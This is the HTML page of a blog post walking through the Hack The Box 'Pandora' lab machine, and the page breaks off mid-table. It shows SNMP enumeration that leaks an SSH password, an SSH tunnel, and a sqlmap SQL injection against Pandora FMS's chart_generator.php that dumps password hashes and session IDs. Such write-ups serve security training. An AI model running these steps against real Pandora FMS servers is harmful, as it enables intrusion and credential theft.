@@ -1,0 +1,595 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    
+      <title>
+        Pandora -- HTB walkthrough ::
+        Werz — CyberSecurity
+      </title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta
+  name="description"
+  content="The official box page on HTB #  Walkthrough #  Port scan | IP 10.10.11.136* #  First, lets echo the ip to the /etc/hosts file with backdoor.htb name.
+sudo bash -c &amp;#34;echo &amp;#39;10.10.11.136 pandora.htb&amp;#39; &amp;gt;&amp;gt; /etc/hosts&amp;#34; Run a nmap scan [-sU for udp scan | -sC for default scripting | -sV for version detection | -T4 for timing template ]
+TCP scan: #  [werz@Arch pandora]$ nmap -sC -sV pandora."
+/>
+<meta
+  name="keywords"
+  content="ctf, hackthebox, writeup, htb writeup, walkthrough, retired htb, hack the box, cybersecurtiy, capture the flag"
+/>
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="https://0xwerz.github.io/08/01/2022/pandora/" />
+
+
+
+
+
+<link rel="stylesheet" href="https://0xwerz.github.io/assets/style.css" />
+
+<link rel="stylesheet" href="https://0xwerz.github.io/style.css" />
+
+
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/site.webmanifest">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+<meta name="msapplication-TileColor" content="#da532c">
+<meta name="theme-color" content="#ffffff">
+
+
+<link href="https://0xwerz.github.io/assets/fonts/Inter-Italic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="https://0xwerz.github.io/assets/fonts/Inter-Regular.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="https://0xwerz.github.io/assets/fonts/Inter-Medium.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="https://0xwerz.github.io/assets/fonts/Inter-MediumItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="https://0xwerz.github.io/assets/fonts/Inter-Bold.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="https://0xwerz.github.io/assets/fonts/Inter-BoldItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Pandora -- HTB walkthrough"/>
+<meta name="twitter:description" content="https://app.hackthebox.com/machines/pandora"/>
+
+
+
+<meta property="og:title" content="Pandora -- HTB walkthrough" />
+<meta property="og:description" content="https://app.hackthebox.com/machines/pandora" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://0xwerz.github.io/08/01/2022/pandora/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-01-08T09:47:56+13:00" />
+<meta property="article:modified_time" content="2022-01-08T09:47:56+13:00" /><meta property="og:site_name" content="Werz" />
+
+
+
+
+
+
+  </head>
+  <body class="light-theme">
+    <div class="container">
+      <header class="header">
+  <span class="header__inner">
+    <a
+  href="https://0xwerz.github.io/"
+  class="logo"
+  style="text-decoration: none;"
+>
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
+</svg>
+</span>
+    <span class="logo__text"
+      >werz@blog:~$</span
+    >
+    <span class="logo__cursor"></span>
+  
+</a>
+
+    <span class="header__right">
+      
+        <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/archive">./archive</a></li>
+        
+      
+        
+          <li><a href="/posts">./articles</a></li>
+        
+      
+        
+          <li><a href="/about">./whoami</a></li>
+        
+      
+      
+      
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/archive">./archive</a></li>
+      
+    
+      
+        <li><a href="/posts">./articles</a></li>
+      
+    
+      
+        <li><a href="/about">./whoami</a></li>
+      
+    
+  </ul>
+</nav>
+
+        <span class="menu-trigger">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none" />
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z" />
+          </svg>
+        </span>
+      
+      <span class="theme-toggle">
+        <svg
+  class="theme-toggler"
+  width="24"
+  height="24"
+  viewBox="0 0 48 48"
+  fill="none"
+  xmlns="http://www.w3.org/2000/svg"
+>
+  <path
+    d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"
+  />
+</svg>
+
+      </span>
+    </span>
+  </span>
+</header>
+
+
+      <div class="content">
+        
+  
+  
+
+  <div class="post">
+    <h1 class="post-title">Pandora &ndash; HTB walkthrough</h1>
+    <div class="post-meta">
+      
+        <span class="post-date">
+          2022-01-08
+        </span>
+
+        
+          
+        
+      
+
+      
+
+
+      
+        <span class="post-read-time"
+          >— 9 min read</span
+        >
+      
+    </div>
+
+    
+      <span class="post-tags">
+        
+          <a href="https://0xwerz.github.io/tags/htb/">#htb</a>&nbsp;
+        
+          <a href="https://0xwerz.github.io/tags/linux/">#linux</a>&nbsp;
+        
+          <a href="https://0xwerz.github.io/tags/easy/">#easy</a>&nbsp;
+        
+          <a href="https://0xwerz.github.io/tags/retired/">#retired</a>&nbsp;
+        
+      </span>
+    
+
+    
+
+    <div class="post-content">
+      
+      The official <h3 id="the-official-box-pagehttpsapphacktheboxcommachinespandora-on-htb">
+  <a href="https://app.hackthebox.com/machines/Pandora" target="_blank">box page</a>
+ on HTB
+  <a href="#the-official-box-pagehttpsapphacktheboxcommachinespandora-on-htb" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<img src="https://github.com/0xWerz/CTF-writeups/raw/main/HTB/Machines/pandora/img/Pandora.png" style="border-radius: 3%;" alt="">
+<h3 id="walkthrough">
+  Walkthrough
+  <a href="#walkthrough" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<h4 id="port-scan--ip-101011136">
+  Port scan | <em>IP 10.10.11.136</em>*
+  <a href="#port-scan--ip-101011136" class="h-anchor" aria-hidden="true">#</a>
+</h4>
+<p>First, lets <strong>echo</strong> the ip to the <code>/etc/hosts</code> file with <code>backdoor.htb</code> name.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo bash -c <span style="color:#e6db74">&#34;echo &#39;10.10.11.136         pandora.htb&#39; &gt;&gt; /etc/hosts&#34;</span>
+</code></pre></div><p>Run a nmap scan [<strong>-sU</strong> for udp scan | <strong>-sC</strong> for default scripting | <strong>-sV</strong> for version detection | <strong>-T4</strong> for timing template ]</p>
+<h3 id="tcp-scan">
+  TCP scan:
+  <a href="#tcp-scan" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>werz@Arch pandora<span style="color:#f92672">]</span>$ nmap -sC -sV pandora.htb -T4
+Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2022-02-18 13:51 CET
+Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.136
+Host is up <span style="color:#f92672">(</span>0.090s latency<span style="color:#f92672">)</span>.
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+80/tcp open  http    Apache httpd 2.4.41 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
+|_http-server-header: Apache/2.4.41 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+|_http-title: Play | Landing
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 9.97 seconds
+</code></pre></div><p>According to the nmap scan, It&rsquo;s a ubuntu machine hosting a webpage on port 80 and a ssh port open.</p>
+<h3 id="udp-scan">
+  UDP scan:
+  <a href="#udp-scan" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>werz@Arch pandora<span style="color:#f92672">]</span>$ sudo nmap -sU -top-ports<span style="color:#f92672">=</span><span style="color:#ae81ff">100</span> pandora.htb
+Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2022-05-18 20:10 UTC
+Nmap scan report <span style="color:#66d9ef">for</span> panda.htb <span style="color:#f92672">(</span>10.10.11.136<span style="color:#f92672">)</span>
+Host is up <span style="color:#f92672">(</span>0.089s latency<span style="color:#f92672">)</span>.
+Not shown: <span style="color:#ae81ff">99</span> closed ports
+PORT    STATE SERVICE
+161/udp open  snmp
+
+Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 95.71 seconds
+
+</code></pre></div><p>So, there is a <strong>SNMP</strong> protocol (simple network management protocol)  port open on 161.</p>
+<h3 id="webpage-enummeration">
+  Webpage enummeration
+  <a href="#webpage-enummeration" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<p>I&rsquo;ve looked manually for some interseting pages seems nothing helpfull, I&rsquo;ll run a <a href="https://github.com/OJ/gobuster" target="_blank">gobuster</a>
+ scan.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>werz@Arch pandora<span style="color:#f92672">]</span>$ gobuster dir -u http://pandora.htb -w ~/opt/SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt
+<span style="color:#f92672">===============================================================</span>
+Gobuster v3.1.0
+by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@firefart<span style="color:#f92672">)</span>
+<span style="color:#f92672">===============================================================</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Url:                     http://pandora.htb
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Method:                  GET
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads:                 <span style="color:#ae81ff">10</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist:                /home/werz/opt/SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Negative Status codes:   <span style="color:#ae81ff">404</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User Agent:              gobuster/3.1.0
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Timeout:                 10s
+<span style="color:#f92672">===============================================================</span>
+2022/05/25 17:02:56 Starting gobuster in directory enumeration mode
+<span style="color:#f92672">===============================================================</span>
+/assets               <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 311<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://pandora.htb/assets/<span style="color:#f92672">]</span>
+Progress: <span style="color:#ae81ff">23207</span> / <span style="color:#ae81ff">220561</span> <span style="color:#f92672">(</span>30.1%<span style="color:#f92672">)</span>                                                ^C
+
+</code></pre></div><p>Nothing looks interesting, ill try with <strong>virtual hosts</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>werz@Arch pandora<span style="color:#f92672">]</span>$ gobuster vhost -u  http://pandora.htb -w ~/opt/SecLists-master/Discovery/DNS/subdomains-top1million-20000.txt  
+<span style="color:#f92672">===============================================================</span>
+Gobuster v3.1.0
+by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@firefart<span style="color:#f92672">)</span>
+<span style="color:#f92672">===============================================================</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Url:             http://pandora.htb
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Method:          GET
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads:         <span style="color:#ae81ff">10</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist:        /home/werz/opt/SecLists-master/Discovery/DNS/subdomains-top1million-20000.txt
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User Agent:      gobuster/3.1.0
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Timeout:         10s
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Append Domain:   false
+<span style="color:#f92672">===============================================================</span>
+2022/05/25 17:08:41 Starting gobuster in VHOST enumeration mode
+<span style="color:#f92672">===============================================================</span>
+Progress: <span style="color:#ae81ff">388</span> / <span style="color:#ae81ff">19967</span> <span style="color:#f92672">(</span>1.94%<span style="color:#f92672">)</span>^C
+</code></pre></div><p>Also nothing p:</p>
+<h2 id="snmp-analysis">
+  snmp analysis
+  <a href="#snmp-analysis" class="h-anchor" aria-hidden="true">#</a>
+</h2>
+<blockquote>
+<p>The box is running SNMPv1. SNMP stands for simple network management protocol, and it is used for network management and monitoring. SNMPv1was defined in RFC1157 and was the first iteration of the SNMP protocol. Because of this, it was designed with no encryption. <a href="https://www.dpstele.com/snmp/what-does-oid-network-elements.php" target="_blank">more</a>
+</p>
+</blockquote>
+<blockquote>
+<p>SNMP gives all kinds of information about a box. For example, it shows some basic information about the host like netstat, ip&rsquo;s, and runnning processes etc..</p>
+</blockquote>
+<p>Let&rsquo;s try to use snmpwalk to connect to that snmap port we&rsquo;ve found then pipe it the a file to easier analysis. Snmpwalk can be downloaded from the net-snmp official website.</p>
+<blockquote>
+<p><strong>-Cr X</strong> X=threads</p>
+</blockquote>
+<p>I&rsquo;ll try the common community string <strong>public</strong> if it doesn&rsquo;t helps ill try to bruteforce it, the default snmpwalk tool takes much time ill run <strong>snmpbulkwalk</strong> cuz with it you can change threads used.</p>
+<p><strong>-Cr X</strong> | X=threads</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>werz@Arch pandora<span style="color:#f92672">]</span>$ snmpwalk -v <span style="color:#ae81ff">1</span> -c public pandora.htb &gt; snmpwalk.txt
+</code></pre></div><p>It takes sometime be patient.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">HOST-RESOURCES-MIB::hrSWRunParameters.843 <span style="color:#f92672">=</span> STRING: <span style="color:#e6db74">&#34;-c sleep 30; /bin/bash -c &#39;/usr/bin/host_check -u daniel -p HotelBabylon23&#39;&#34;</span>
+</code></pre></div><p>As you can see, while I was going through the information I found a clear text username and password, so I used those to log into the machine via SSH.</p>
+<p>We are in as Daniel!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">daniel@pandora:~$ cat /etc/passwd | grep sh 
+
+root:x:0:0:root:/root:/bin/bash
+sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
+matt:x:1000:1000:matt:/home/matt:/bin/bash
+daniel:x:1001:1001::/home/daniel:/bin/bash
+</code></pre></div><p>so yeah there is another user, that own the the user flag.</p>
+<p>lets take a look for some hosts.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">daniel@pandora:~$ daniel@pandora:~$ cat /etc/hosts
+127.0.0.1 localhost.localdomain pandora.htb pandora.pandora.htb
+127.0.1.1 pandora
+
+<span style="color:#75715e"># The following lines are desirable for IPv6 capable hosts</span>
+::1     ip6-localhost ip6-loopback
+fe00::0 ip6-localnet
+ff00::0 ip6-mcastprefix
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+</code></pre></div><p>Apache site configurations are in <code>/etc/apache2/sites-enabled</code></p>
+<pre tabindex="0"><code>daniel@pandora:/etc/apache2/sites-enabled$ ls
+000-default.conf  pandora.conf
+</code></pre><p>in this case there is two configurations.</p>
+<p><code>000-default.conf</code> file looks like a standard webserver, listening on 80, and hosting out of /var/www/html:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">daniel@pandora:/etc/apache2/sites-enabled$ cat 000-default.conf 
+&lt;VirtualHost *:80&gt;
+	<span style="color:#75715e"># The ServerName directive sets the request scheme, hostname and port that</span>
+	<span style="color:#75715e"># the server uses to identify itself. This is used when creating</span>
+	<span style="color:#75715e"># redirection URLs. In the context of virtual hosts, the ServerName</span>
+	<span style="color:#75715e"># specifies what hostname must appear in the request&#39;s Host: header to</span>
+	<span style="color:#75715e"># match this virtual host. For the default virtual host (this file) this</span>
+	<span style="color:#75715e"># value is not decisive as it is used as a last resort host regardless.</span>
+	<span style="color:#75715e"># However, you must set it for any further virtual host explicitly.</span>
+	<span style="color:#75715e">#ServerName www.example.com</span>
+
+	ServerAdmin webmaster@localhost
+	DocumentRoot /var/www/html
+</code></pre></div><p><code>pandora.conf</code> configurations loooks more interesting:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">daniel@pandora:/etc/apache2/sites-enabled$ cat pandora.conf 
+&lt;VirtualHost localhost:80&gt;
+  ServerAdmin admin@panda.htb
+  ServerName pandora.panda.htb
+  DocumentRoot /var/www/pandora
+  AssignUserID matt matt
+  &lt;Directory /var/www/pandora&gt;
+    AllowOverride All
+  &lt;/Directory&gt;
+  ErrorLog /var/log/apache2/error.log
+  CustomLog /var/log/apache2/access.log combined
+&lt;/VirtualHost&gt;
+</code></pre></div><p>It’s  listening on localhost, and the server name is pandora.panda.htb. It’s hosted in /var/www/pandora, and as <strong>matt</strong>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">daniel@pandora:/var/www$ ll
+total <span style="color:#ae81ff">16</span>
+drwxr-xr-x  <span style="color:#ae81ff">4</span> root root <span style="color:#ae81ff">4096</span> Dec  <span style="color:#ae81ff">7</span> 14:32 ./
+drwxr-xr-x <span style="color:#ae81ff">14</span> root root <span style="color:#ae81ff">4096</span> Dec  <span style="color:#ae81ff">7</span> 14:32 ../
+drwxr-xr-x  <span style="color:#ae81ff">3</span> root root <span style="color:#ae81ff">4096</span> Dec  <span style="color:#ae81ff">7</span> 14:32 html/
+drwxr-xr-x  <span style="color:#ae81ff">3</span> matt matt <span style="color:#ae81ff">4096</span> Dec  <span style="color:#ae81ff">7</span> 14:32 pandora/
+</code></pre></div><p>I’ll set pandora.panda.htb to 127.0.0.1 in my /etc/hosts file, then I’ll reconnect my SSH session with <code>-L 9001:localhost:80</code> so that 9001 on my local machine now forwards to localhost port 80 on Pandora.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ssh -L 9001:localhost:80 daniel@pandora.htb
+</code></pre></div><p><img src="./img/pandora_page.png" alt="pandora_cms_page"></p>
+<p>Navigating to localhost.localdomain/pandora_console will show us a login page for some software called Pandora FMS. according to the version that is typed in the bottom the page <strong>v7.0NG.742_FIX_PERL2020</strong> there is are lots of <a href="https://blog.sonarsource.com/pandora-fms-742-critical-code-vulnerabilities-explained/" target="_blank">CVEs</a>
+ one of the vulns says that its a sql vuln.</p>
+<p>The injections is in <code>/include/chart_generator.php</code> It passes $_REQUEST[&lsquo;session_id&rsquo;] to the constructor for a PandoraFMS\User object, and that is not sanitized.</p>
+<p>I&rsquo;ll try to request a <code>?session_id='</code> parameter to <code>include/chart_generator.php</code>, and it returns an SQL error:</p>
+<p><img src="./img/sql_inj.png" alt="sql_inj"></p>
+<p>I&rsquo;ll use sqlmap for this injection, so I will need to use a great tool called proxychains. Proxychains was designed to create a chain of proxies that allow you to pivot your tools into systems without having to install tools on the other side of whatever you are attacking into.</p>
+<p>To use proxychains, we need to specify the dynamic tunnel to pivot through via the <code>/etc/proxychains.conf</code> file.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>ProxyList<span style="color:#f92672">]</span>
+<span style="color:#75715e"># add proxy here ...</span>
+<span style="color:#75715e"># meanwile</span>
+<span style="color:#75715e"># defaults set to &#34;tor&#34;</span>
+<span style="color:#75715e">#socks4 	127.0.0.1 9050</span>
+socks5 127.0.0.1 <span style="color:#ae81ff">9001</span> daniel HotelBabylon23
+</code></pre></div><p>Now, we can run a sql attack against the chart generator php file.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>werz@Arch pandora<span style="color:#f92672">]</span>$ sqlmap --url<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://localhost:9001/pandora_console/include/chart_generator.php?session_id=&#39;&#39;&#34;</span> -D pandora --tables
+</code></pre></div><p>sqlmap dumped a lot of tables <code>tpassword_history</code> table looks intersting, lets dump it.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>werz@Arch pandora<span style="color:#f92672">]</span>$ sqlmap --url<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://localhost:9001/pandora_console/include/chart_generator.php?session_id=&#39;&#39;&#34;</span> -Ttpassword_history --dump
+</code></pre></div><p>so it contains password hashes for matt and daniel.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#66d9ef">do</span> you want to crack them via a dictionary-based attack? <span style="color:#f92672">[</span>Y/n/q<span style="color:#f92672">]</span> n
+Database: pandora
+Table: tpassword_history
+<span style="color:#f92672">[</span><span style="color:#ae81ff">2</span> entries<span style="color:#f92672">]</span>
++---------+---------+---------------------+----------------------------------+---------------------+
+| id_pass | id_user | date_end            | password                         | date_begin          |
++---------+---------+---------------------+----------------------------------+---------------------+
+| <span style="color:#ae81ff">1</span>       | matt    | 0000-00-00 00:00:00 | f655f807365b6dc602b31ab3d6d43acc | 2021-06-11 17:28:54 |
+| <span style="color:#ae81ff">2</span>       | daniel  | 0000-00-00 00:00:00 | 76323c174bd49ffbbdedf678f6cc89a6 | 2021-06-17 00:11:54 |
++---------+---------+---------------------+----------------------------------+---------------------+
+</code></pre></div><p>We can try to crack them, its a long story to do.</p>
+<p>There is a <code>tsessions_php</code> table lets to the same.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span><span style="color:#ae81ff">59</span> entries<span style="color:#f92672">]</span>
++----------------------------+------------------------------------------------------+-------------+
+| id_session                 | data                                                 | last_active |
++----------------------------+------------------------------------------------------+-------------+
+| 09vao3q1dikuoi1vhcvhcjjbc6 | id_usuario|s:6:<span style="color:#e6db74">&#34;daniel&#34;</span>;                             | <span style="color:#ae81ff">1638783555</span>  |
+| 0ahul7feb1l9db7ffp8d25sjba | NULL                                                 | <span style="color:#ae81ff">1638789018</span>  |
+| 0qg7gms27ash6cbpvq6acp901t | NULL                                                 | <span style="color:#ae81ff">1653738015</span>  |
+| 1cq3ela4hiscf9d9qajhntq2k1 | NULL                                                 | <span style="color:#ae81ff">1653737956</span>  |
+| 1um23if7s531kqf5da14kf5lvm | NULL                                                 | <span style="color:#ae81ff">1638792211</span>  |
+| 21e8enmvopuoeb8r44q7o34hik | NULL                                                 | <span style="color:#ae81ff">1653737679</span>  |
+| 2e25c62vc3odbppmg6pjbf9bum | NULL                                                 | <span style="color:#ae81ff">1638786129</span>  |
+| 346uqacafar8pipuppubqet7ut | id_usuario|s:6:<span style="color:#e6db74">&#34;daniel&#34;</span>;                             | <span style="color:#ae81ff">1638540332</span>  |
+| 36n1kllgd0bh31f9rerm97gbcm | NULL                                                 | <span style="color:#ae81ff">1653736273</span>  |
+| 3me2jjab4atfa5f8106iklh4fc | NULL                                                 | <span style="color:#ae81ff">1638795380</span>  |
+| 3s03i6t3h6v845tkkig6c09j1s | id_usuario|s:6:<span style="color:#e6db74">&#34;daniel&#34;</span>;                             | <span style="color:#ae81ff">1653737556</span>  |
+| 4f51mju7kcuonuqor3876n8o02 | NULL                                                 | <span style="color:#ae81ff">1638786842</span>  |
+| 4nsbidcmgfoh1gilpv8p5hpi2s | id_usuario|s:6:<span style="color:#e6db74">&#34;daniel&#34;</span>;                             | <span style="color:#ae81ff">1638535373</span>  |
+| 59qae699l0971h13qmbpqahlls | NULL                                                 | <span style="color:#ae81ff">1638787305</span>  |
+| 5fihkihbip2jioll1a8mcsmp6j | NULL                                                 | <span style="color:#ae81ff">1638792685</span>  |
+| 5i352tsdh7vlohth30ve4o0air | id_usuario|s:6:<span style="color:#e6db74">&#34;daniel&#34;</span>;                             | <span style="color:#ae81ff">1638281946</span>  |
+| 69gbnjrc2q42e8aqahb1l2s68n | id_usuario|s:6:<span style="color:#e6db74">&#34;daniel&#34;</span>;                             | <span style="color:#ae81ff">1641195617</span>  |
+| 7k3516hk2n20od1bhupf2bafri | NULL                                                 | <span style="color:#ae81ff">1653737430</span>  |
+| 81f3uet7p3esgiq02d4cjj48rc | NULL                                                 | <span style="color:#ae81ff">1623957150</span>  |
+| 8m2e6h8gmphj79r9pq497vpdre | id_usuario|s:6:<span style="color:#e6db74">&#34;daniel&#34;</span>;                             | <span style="color:#ae81ff">1638446321</span>  |
+| 8upeameujo9nhki3ps0fu32cgd | NULL                                                 | <span style="color:#ae81ff">1638787267</span>  |
+| 9vv4godmdam3vsq8pu78b52em9 | id_usuario|s:6:<span style="color:#e6db74">&#34;daniel&#34;</span>;                             | <span style="color:#ae81ff">1638881787</span>  |
+| a3a49kc938u7od6e6mlip1ej80 | NULL                                                 | <span style="color:#ae81ff">1638795315</span>  |
+| a6s0p2o00rgo3io868lo5p1une | NULL                                                 | <span style="color:#ae81ff">1653738082</span>  |
+| agfdiriggbt86ep71uvm1jbo3f | id_usuario|s:6:<span style="color:#e6db74">&#34;daniel&#34;</span>;                             | <span style="color:#ae81ff">1638881664</span>  |
+| b1fva3f8svoulqhfjmcuf2f00f | id_usuario|s:6:<span style="color:#e6db74">&#34;daniel&#34;</span>;                             | <span style="color:#ae81ff">1653736657</span>  |
+| cojb6rgubs18ipb35b3f6hf0vp | NULL                                                 | <span style="color:#ae81ff">1638787213</span>  |
+| d0carbrks2lvmb90ergj7jv6po | NULL                                                 | <span style="color:#ae81ff">1638786277</span>  |
+| d28798b394ickeqmnfc4q12fkb | NULL                                                 | <span style="color:#ae81ff">1653738044</span>  |
+| d8nm5tl88u5n8274it7acl65ko | NULL                                                 | <span style="color:#ae81ff">1653738003</span>  |
+| f0qisbrojp785v1dmm8cu1vkaj | id_usuario|s:6:<span style="color:#e6db74">&#34;daniel&#34;</span>;                             | <span style="color:#ae81ff">1641200284</span>  |
+| fikt9p6i78no7aofn74rr71m85 | NULL                                                 | <span style="color:#ae81ff">1638786504</span>  |
+| fqd96rcv4ecuqs409n5qsleufi | NULL                                                 | <span style="color:#ae81ff">1638786762</span>  |
+| g0kteepqaj1oep6u7msp0u38kv | id_usuario|s:6:<span style="color:#e6db74">&#34;daniel&#34;</span>;                             | <span style="color:#ae81ff">1638783230</span>  |
+| g4e01qdgk36mfdh90hvcc54umq | id_usuario|s:4:<span style="color:#e6db74">&#34;matt&#34;</span>;alert_msg|a:0:<span style="color:#f92672">{}</span>new_chat|b:0;  | <span style="color:#ae81ff">1638796349</span>  |
+| gf40pukfdinc63nm5lkroidde6 | NULL                                                 | <span style="color:#ae81ff">1638786349</span>  |
+| gg7tint1mddo1ou25dqo9p15fh | NULL                                                 | <span style="color:#ae81ff">1653735060</span>  |
